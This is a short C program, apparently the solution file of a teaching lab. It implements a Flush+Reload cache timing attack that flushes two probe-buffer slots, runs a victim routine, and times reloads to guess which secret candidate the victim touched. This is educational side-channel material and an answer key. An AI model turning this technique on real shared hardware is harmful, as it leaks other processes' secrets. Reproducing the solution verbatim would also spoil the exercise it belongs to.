#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#include "cacheutils.h"
#include "common.h"

extern void run_victim(void);
extern uint8_t probe_buffer[];

#define REPEAT 10

int main(void) {
    /* BEGIN_SOLUTION */

    uint64_t times[2][REPEAT];

    for (int r = 0; r < REPEAT; r++) {
        // 1) Flush both probe slots'
        flush(&probe_buffer[IDX_A]);
        flush(&probe_buffer[IDX_B]);

        // 2) Victim runs once, touching exactly one slot
    /* END_SOLUTION */
        run_victim();
    /* BEGIN_SOLUTION */

        // 3) Reload both and record timings
        times[0][r] = reload(&probe_buffer[IDX_A]);
        times[1][r] = reload(&probe_buffer[IDX_B]);
    }

    // Compute medians
    uint64_t meda, medb ;
    compute_median(times[0], REPEAT, &meda);
    compute_median(times[1], REPEAT, &medb);

    printf("Median times: candidate a=%lu cycles, candidate b=%lu cycles\n", meda, medb);

    char guessed = (meda < medb) ? 'a' : 'b';
    printf("Guessed secret_candidate = %c\n", guessed);
    /* END_SOLUTION */

    return 0;
}
